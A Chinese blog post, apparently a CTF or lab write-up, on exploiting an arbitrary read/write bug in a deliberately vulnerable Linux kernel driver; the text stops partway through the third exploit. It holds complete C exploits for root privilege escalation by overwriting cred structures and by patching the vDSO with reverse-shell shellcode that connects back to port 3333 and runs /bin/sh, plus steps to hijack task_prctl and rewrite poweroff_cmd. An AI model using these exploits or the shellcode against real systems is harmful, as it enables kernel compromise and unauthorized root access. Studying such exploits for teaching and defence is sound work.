---
layout: post
title: 任意读写漏洞进行提权
excerpt: "kernel pwn"
categories: [kernelpwn]
comments: true
---

#### 功能介绍
ARBITRARY_RW_INIT
```
		case ARBITRARY_RW_INIT:
		{
			init_args i_args;//就是一个size_t类型的size
			int ret;

			if(copy_from_user(&i_args, p_arg, sizeof(init_args)))//将用户输入传入
				return -EINVAL;

			ret = arbitrary_rw_init(&i_args);	//然后进这个函数,其实就是传入了一个size
			break;
		}
```
其中init_args结构如下
```
	typedef struct init_args {
		size_t size;
	}init_args;
```
继续跟进函数如下
```
	static int arbitrary_rw_init(init_args *args)
	{
		if(args->size == 0 || g_mem_buffer != NULL)
			return -EINVAL;

		g_mem_buffer = kmalloc(sizeof(mem_buffer), GFP_KERNEL);//开辟一块内存空间

		if(g_mem_buffer == NULL)
			goto error_no_mem;

		g_mem_buffer->data = kmalloc(args->size, GFP_KERNEL);	 //根据传入的大小为新分配的data赋值

		if(g_mem_buffer->data == NULL)
			goto error_no_mem_free;

		g_mem_buffer->data_size = args->size;
		g_mem_buffer->pos = 0;

		printk(KERN_INFO "[x] Allocated memory with size %lu [x]\n", g_mem_buffer->data_size);

		return 0;

		error_no_mem:
			return -ENOMEM;

		error_no_mem_free:
			kfree(g_mem_buffer);
			return -ENOMEM;
	}
```
上边代码的作用就是为mem_buffer开辟一块空间,然后其数据指向用户开辟的空间.

其中全局结构体,其中包含了数据的大小和指针
```
	typedef struct mem_buffer {
		size_t data_size;
		char *data;
		loff_t pos;
	}mem_buffer;
```
ARBITRARY_RW_REALLOC
```
		case ARBITRARY_RW_REALLOC:
		{
			realloc_args r_args;

			if(copy_from_user(&r_args, p_arg, sizeof(realloc_args)))
				return -EINVAL;

			ret = realloc_mem_buffer(&r_args);
			break;
		}
```
其实就是传入了如下结构体
```
	typedef struct realloc_args {
		int grow;
		size_t size;
	}realloc_args;
```
跟进函数,发现这个函数就是一个重新定义的过程
```
	static int realloc_mem_buffer(realloc_args *args)       //传入的参数就是一个int grow;,一个size_t size
	{
		if(g_mem_buffer == NULL)
			return -EINVAL;

		size_t new_size;
		char *new_data;

		//We can overflow size here by making new_size = -1
		if(args->grow)
			new_size = g_mem_buffer->data_size + args->size;    //g_mem_buffer就是之前介绍的全局变量,通过控制args->size,使new_size为-1
		else
			new_size = g_mem_buffer->data_size - args->size;

		//new_size here will equal 0 krealloc(..., 0) = ZERO_SIZE_PTR
		new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);     //kmalloc(0)会返回0x10

		//missing check for return value ZERO_SIZE_PTR
		if(new_data == NULL)
			return -ENOMEM;

		g_mem_buffer->data = new_data;      //0x10
		g_mem_buffer->data_size = new_size;     //0xffffffffffffffff

		printk(KERN_INFO "[x] g_mem_buffer->data_size = %lu [x]\n", g_mem_buffer->data_size);

		return 0;
	}
```
再分析读取
```
		case ARBITRARY_RW_READ:
		{
			read_args r_args;

			if(copy_from_user(&r_args, p_arg, sizeof(read_args)))
				return -EINVAL;

			ret = read_mem_buffer(r_args.buff, r_args.count);
			break;
		}
```
其中结构体
```
	typedef struct read_args {
		char *buff;
		size_t count;
	}read_args;
```
跟进读取函数
```
	static int read_mem_buffer(char __user *buff, size_t count)     //  一个是 char *buff; 一个是 size_t count;
	{
		if(g_mem_buffer == NULL)
			return -EINVAL;

		loff_t pos;
		int ret;

		pos = g_mem_buffer->pos;

		if((count + pos) > g_mem_buffer->data_size)
			return -EINVAL;

		ret = copy_to_user(buff, g_mem_buffer->data + pos, count);// g_mem_buffer->data + pos, count 均可控,造成任意地址读取

		return ret;
	}
```

漏洞：`realloc_mem_buffer()`中未检查传入变量`args->size`的正负，可以传入负数。如果通过传入负数，使得`new_size== -1`，由于`kmalloc(new_size+1)`，由于`kmalloc(0)`会返回`0x10`，这样`g_mem_buffer->data == 0x10`; `g_mem_buffer->data_size == 0xffffffffffffffff`，读写时只会检查是否满足`((count + pos) < g_mem_buffer->data_size)`条件，实现任意地址读写。

### 方法一：修改cred结构提权
思路：利用任意读找到cred结构体，再利用任意写，将用于表示权限的数据位写0，即可提权。

利用任意读找到结构体如下
```
//裁剪过后 
struct task_struct {
    volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
    void *stack;
    atomic_t usage;
    unsigned int flags; /* per process flags, defined below */
    unsigned int ptrace;
... ...

/* process credentials */
    const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
    const struct cred __rcu *real_cred; /* objective and real subjective task
                     * credentials (COW) */
    const struct cred __rcu *cred;  /* effective (overridable) subjective task
                     * credentials (COW) */
    char comm[TASK_COMM_LEN];		//根据这个查找 /* executable name excluding path
                     - access with [gs]et_task_comm (which lock
                       it with task_lock())
                     - initialized normally by setup_new_exec */
/* file system info */
    struct nameidata *nameidata;
#ifdef CONFIG_SYSVIPC
/* ipc stuff */
    struct sysv_sem sysvsem;
    struct sysv_shm sysvshm;
#endif
... ... 
};
```
其中，cred结构体（\include\linux\cred.h 118）就表示该线程的权限。只要将结构体的uid~fsgid全部覆写为0即可提权该线程（root uid为0）。前28字节

思路：利用任意读找到cred结构体，再利用任意写，将用于表示权限的数据位写0，即可提权。

搜索cred结构体：task_struct里有个char comm[TASK_COMM_LEN];结构，这个结构可通过prctl函数中的PR_SET_NAME功能，设置为一个小于16字节的字符串。

方法：设定该值作为标记，利用任意读找到该字符串，即可找到task_structure，进而找到cred结构体，再利用任意写提权。

确定爆破范围：task_structure是通过调用kmem_cache_alloc_node()分配的，所以kmem_cache_alloc_node应该存在内核的动态分配区域。(\kernel\fork.c 140)。
```
static inline struct task_struct *alloc_task_struct_node(int node)
{
    return kmem_cache_alloc_node(task_struct_cachep, GFP_KERNEL, node);
}
```
根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000。


#### 开始
首先解压cpio文件
```
cpio -idmv < vuln_driver.cpio
```
压缩系统文件
```
find . | cpio -o --format=newc > ../rootfs.img
```
启动脚本
```
#!/bin/sh
qemu-system-x86_64 \
	-m 1024 -smp cores=2,threads=2,sockets=1 \
	-display none -serial stdio -no-reboot \
	-cpu kvm64,+smep \
	-initrd ./rootfs.img \
	-kernel ./bzImage \
	-gdb tcp::1234 \
	-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet "
```

完整的代码
```
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>

#ifndef _VULN_DRIVER_
#define _VULN_DRIVER_
#define DEVICE_NAME "vulnerable_device"
#define IOCTL_NUM 0xFE
#define DRIVER_TEST _IO (IOCTL_NUM,0)
#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffff880000000000
#define END_ADDR 0xffffc80000000000

struct init_args {
    size_t size;
};
struct realloc_args{
    int grow;
    size_t size;
};
struct read_args{
    char *buff;
    size_t count;
};
struct seek_args{
    loff_t new_pos;
};
struct write_args{
    char *buff;
    size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
    struct seek_args s_args2;
    struct read_args r_args;
    int ret;

    s_args2.new_pos=addr-0x10;
    ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
    r_args.buff=buff;
    r_args.count=count;
    ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
    return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
    struct seek_args s_args1;
    struct write_args w_args;
    int ret;

    s_args1.new_pos=addr-0x10;
    ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
    w_args.buff=buff;
    w_args.count=count;
    ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
    return ret;
}

int main()
{
    int fd=-1;
    int result=0;
    struct init_args i_args;
    struct realloc_args rello_args;
    size_t real_cred=0;
    size_t cred=0;
    size_t target_addr;
    int root_cred[12];

    setvbuf(stdout, 0LL, 2, 0LL);       //定义流 stream 应如何缓冲
    char *buf=malloc(0x1000);
    char target[16];

    strcpy(target,"try2findmesauce");
    prctl(PR_SET_NAME,target);              //通过prctl设置字符串为try2findmesauce
    fd=open(PATH,O_RDWR);                   //      打开驱动/dev/vulnerable_device
    if (fd<0){
        puts("[-] open error ! \n");
        exit(-1);
    }
    //  爆破出 cred地址
    i_args.size=0x100;
    ioctl(fd, ARBITRARY_RW_INIT, &i_args);      // 进行初始化,data大小为0x100
    rello_args.grow=0;
    rello_args.size=0x100+1;
    ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);             // 重新分配地址data大小,这里使 g_mem_buffer->data=0x10,g_mem_buffer->data_size = 0xffffffffffffffff
    puts("[+] We can read and write any memory! [+]");
    for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
    {
        read_mem(fd,addr,buf,0x1000);                   // 每次读取0x1000
        result=memmem(buf,0x1000,target,16);            //然后进行查找
        if (result)
        {
            printf("[+] Find try2findmesauce at : %p\n",result);
            cred=*(size_t *)(result-0x8);               //根据相对位置,找出cred位置
            real_cred=*(size_t *)(result-0x10);         // 再找出real_cred的位置
            if ((cred || 0xff00000000000000) && (real_cred == cred))
            {
                target_addr=addr+result-(long int)(buf);
                printf("[+] found task_struct 0x%x\n",target_addr);
                printf("[+] found cred 0x%lx\n",real_cred);
                break;
            }
        }
    }
    if (result==0)
    {
        puts("[-] not found, try again! \n");
        exit(-1);
    }
    // 修改cred
    memset((char *)root_cred,0,28);
    write_mem(fd,cred,root_cred,28);

    if (getuid()==0)
    {
        printf("[+] Now you are r00t, enjoy your shell\n");
        system("/bin/sh");
    }
    else
    {
        puts("[-] There are something wrong!\n");
        exit(-1);
    }
    return 0;
}
```
### 方法二：劫持VDSO
VDSO是内核通过映射方法与用户态共享一块物理内存，从而加快执行效率，也叫影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，vdso和vsyscall。
```
gdb-peda$ cat /proc/self/maps
00400000-0040c000 r-xp 00000000 08:01 561868                             /bin/cat
0060b000-0060c000 r--p 0000b000 08:01 561868                             /bin/cat
0060c000-0060d000 rw-p 0000c000 08:01 561868                             /bin/cat
01cff000-01d20000 rw-p 00000000 00:00 0                                  [heap]
...
7fff937d7000-7fff937d9000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```
vsyscall和VDSO都是为了避免传统系统调用模式INT 0x80/SYSCALL造成的内核空间和用户空间的上下文切换。vsyscall只允许4个系统调用，且在每个进程中静态分配了相同的地址；VDSO是动态分配的，地址随机，可提供超过4个系统调用，VDSO是glibc库提供的功能。

VDSO—Virtual Dynamic Shared Object。本质就是映射到内存中的.so文件，对应的程序可以当普通的.so来使用其中的函数。VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。

VDSO在每个程序启动的加载过程如下：
```
#0  remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737
#1  0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 <vdso_image_64>, calculate_addr=<optimized out>) at arch/x86/entry/vdso/vma.c:151
#2  0xffffffff81004267 in arch_setup_additional_pages (bprm=<optimized out>, uses_interp=<optimized out>) at arch/x86/entry/vdso/vma.c:209
#3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080
#4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469
```
在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。

##### 利用方式
首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。

其次，等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权。
与上一中方法不同的是，这种方法并不直接提权，而是采用守株待兔的方法，等待其他高权限进程触发，而返回shell。

如何爆破找到vdso呢？首先根据上文的内核内存图可以确定vdso的范围在0xffffffff80000000~0xffffffffffffefff，而且该映射满足页对齐，并且存在ELF文件结构，且所有内存值都可以知道，如用如下脚本可以dump出vdso，比较坑的是每个版本的vdso函数偏移都不一样：
```
//dump_vdos.c
// 获取gettimeofday 字符串的偏移，便于爆破；dump vdso还是需要在程序中爆破VDSO地址，然后gdb中断下，$dump memory即可（VDSO地址是从ffffffff开头的）。
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/auxv.h> 

 #include <sys/mman.h>
int main(){
    int test;
    size_t result=0;
    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
    result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
    printf("[+]VDSO : %p\n",sysinfo_ehdr);
    printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
    scanf("Wait! %d", test);  
    /* 
    gdb break point at 0x400A36
    and then dump memory
    why only dump 0x1000 ???
    */
    if (sysinfo_ehdr!=0){
        for (int i=0;i<0x2000;i+=1){
            printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));
        }
    }
}
```
或者
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/auxv.h> 

 #include <sys/mman.h>
int main(){

	unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
	if (sysinfo_ehdr!=0){
		for (int i=0;i<0x2000;i+=1){
			printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));
		}
	}

}
```
经过上述步骤之后，仅需将vdso中gettimeofday函数覆写成仅有root进程提权即可，使用如下shellcode。
```
https://gist.github.com/itsZN/1ab36391d1849f15b785
"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";


nop
push rbx
xor rax,rax
mov al, 0x66
syscall #check uid
xor rbx,rbx
cmp rbx,rax
jne emulate

xor rax,rax
mov al,0x39
syscall #fork
xor rbx,rbx
cmp rax,rbx
je connectback

emulate:
pop rbx
xor rax,rax
mov al,0x60
syscall
retq

connectback:
xor rdx,rdx
pushq 0x1
pop rsi
pushq 0x2
pop rdi
pushq 0x29
pop rax 
syscall #socket

xchg rdi,rax
push rax
mov rcx, 0xfeffff80faf2fffd
not rcx
push rcx
mov rsi,rsp
pushq 0x10
pop rdx
pushq 0x2a
pop rax
syscall #connect

xor rbx,rbx
cmp rax,rbx
je sh
xor rax,rax
mov al,0xe7
syscall #exit

sh:
nop
pushq 0x3
pop rsi
duploop:
pushq 0x21
pop rax
dec rsi
syscall #dup
jne duploop

mov rbx,0xff978cd091969dd0
not rbx
push rbx
mov rdi,rsp
push rax
push rdi
mov rsi,rsp
xor rdx,rdx
mov al,0x3b
syscall #execve
xor rax,rax
mov al,0xe7
syscall
```
它将连接到127.0.0.1:3333并执行”/bin/sh”），用"nc -l -p 3333 -v"链接即可；shellcode写到gettimeofday附近，通过dump vDSO确定，本题是0xca0
##### 整合利用步骤
由于进程不会主动调用gettimeofday来触发shellcode，所以我们自己写一个循环程序，不断调用gettimeofday。,然后在init中后台启动
```
//sudo_me.c           一定要动态编译，不然不会调用gettimeofday函数,还要在_install根目录下创建lib64文件，文件里放需要用到的库（ld-linux-x86-64.so.2 和 libc.so.6）。
#include <stdio.h>

int main(){
    while(1){
        puts("111");
        sleep(1);
        gettimeofday();
    }
}
```
在init中添加如下代码
```
nohup /sudo_me &
```
exp代码
```
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffffffff80000000
#define END_ADDR 0xffffffffffffefff

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}

int check_vdso_shellcode(char *shellcode)
{
	size_t addr=0;
	addr=getauxval(AT_SYSINFO_EHDR);
	printf("[+] vdso: 0x%lx\n");
	if (addr<0)
	{
		puts("[-] Cannnot get VDSO addr\n");
		return 0;
	}
	if (memmem((char *)addr,0x1000, shellcode,strlen(shellcode)))
	{
		return 1;
	}
	return 0;
}

int main()
{
	int fd=-1;
	int result=0;
	struct init_args i_args;
	struct realloc_args rello_args;
	char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";

	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	fd=open(PATH,O_RDWR);       // 打开   /dev/vulnerable_device
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
    // 构造任意地址读写
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	//爆破VDSO地址
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);   // 遍历读取0x1000
		if (!strcmp("gettimeofday",buf+0x2cd))      // 根据字符串的偏移找到vdso的位置
		{
			result=addr;
			printf("[+] found vdso 0x%lx\n",result);
			break;
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
	// shellcode写到VDSO,覆盖gettimeofday
	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  函数的偏移进行覆盖

	if (check_vdso_shellcode(shellcode)!=0)
	{
		printf("[+] Shellcode is written into vdso, waiting for reverse shell :\n");
		system("nc -lp 3333");
	}
	else
	{
		puts("[-] There are something wrong!\n");
		exit(-1);
	}
	return 0;
}
```

#### 方法三：利用call_usermodehelper()
同样是利用任意地址修改,劫持某个函数,然后调用,进行提权

#### call_usermodehelper()原理
call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。但其中提到在安卓利用时需要关闭SEAndroid。

我们要劫持task_prctl到call_usermoderhelper吗，不是的，因为这里的第一个参数也是64位的，也不能直接劫持过来(劫持后的函数第一个参数为地址指针)。但是内核中有些代码片段是调用了Call_usermoderhelper的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过SMEP）。

也就是有些函数从内核调用了用户空间，例如kernel/reboot.c中的__orderly_poweroff函数中调用了run_cmd参数是poweroff_cmd,而且poweroff_cmd是一个全局变量，可以修改后指向我们的命令。

```
static int __orderly_poweroff(bool force)
{
    int ret;

    ret = run_cmd(poweroff_cmd);

    if (ret && force) {
        pr_warn("Failed to start orderly shutdown: forcing the issue\n");

        /*
         * I guess this should try to kick off some daemon to sync and
         * poweroff asap.  Or not even bother syncing if we're doing an
         * emergency shutdown?
         */
        emergency_sync();
        kernel_power_off();
    }

    return ret;
}

static void poweroff_work_func(struct work_struct *work)
{
    __orderly_poweroff(poweroff_force);
}
```
而run_cmd内部调用了callusermodehelper
```
static int run_cmd(const char *cmd)
{
    char **argv;
    static char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    int ret;
    argv = argv_split(GFP_KERNEL, cmd, NULL);
    if (argv) {
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        argv_free(argv);
    } else {
        ret = -ENOMEM;
    }

    return ret;
}
```
我们可以将task_prctl劫持为__orderly_poweroff,来进行提权
##### 利用步骤

1. 利用kremalloc的问题，达到任意地址读写的能力
2. 通过快速爆破，泄露出VDSO地址。
3. 利用VDSO和kernel_base相差不远的特性，泄露出内核基址。（泄露VDSO是为了泄露内核基址？）
4. 篡改poweroff_cmd使其等于我们预期执行的命令（"/bin/chmod 777 /flag\0"）。或者将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。
5. 篡改prctl的hook为orderly_poweroff
6. 调用prctl执行我们预期的命令，达到内核提权的效果。

首先写一个程序,确定`hp->hook.task_prctl`位置
```
#include <sys/prctl.h>  
#include <string.h>
#include <stdio.h>

void exploit(){
    prctl(0,0);
}

int main(int argc,char * argv[]){
    if(argc > 1){
        if(!strcmp(argv[1],"--breakpoint")){
            printf("[%p]n",exploit);
        }
        return 0;
    }
    exploit();
    return 0;
}
```
在security_task_prctl下断点,然后运行到这里
```
[-------------------------------------code-------------------------------------]
   0xffffffff81355094:	mov    r14d,edi
   0xffffffff81355097:	mov    r13,rsi
   0xffffffff8135509a:	mov    r12,rdx
=> 0xffffffff8135509d:	mov    rax,QWORD PTR [rbx+0x18]
   0xffffffff813550a1:	mov    r8,QWORD PTR [rbp-0x38]
   0xffffffff813550a5:	mov    rdx,r12
   0xffffffff813550a8:	mov    rcx,QWORD PTR [rbp-0x30]
   0xffffffff813550ac:	mov    rsi,r13
[------------------------------------stack-------------------------------------]
0000| 0xffff880037fcfeb0 --> 0x2 
0004| 0xffff880037fcfeb4 --> 0x0 
0008| 0xffff880037fcfeb8 --> 0x454320 --> 0xfa1e0ff3 
0012| 0xffff880037fcfebc --> 0x0 
0016| 0xffff880037fcfec0 --> 0x90a3a318 
0020| 0xffff880037fcfec4 --> 0x7ffd 
0024| 0xffff880037fcfec8 --> 0x0 
0028| 0xffff880037fcfecc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xffffffff8135509d in ?? ()
gdb-peda$ x/gx $rbx+0x18
0xffffffff81e9bcd8:	0xffffffff813504f0
gdb-peda$ x/gx $rbx
0xffffffff81e9bcc0:	0xffffffff81ea4b80
```
此时运行到`hp->hook.task_prctl`,我们劫持的地址是`0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8`


完整的exp如下
```
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffffffff80000000
#define END_ADDR 0xffffffffffffefff

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
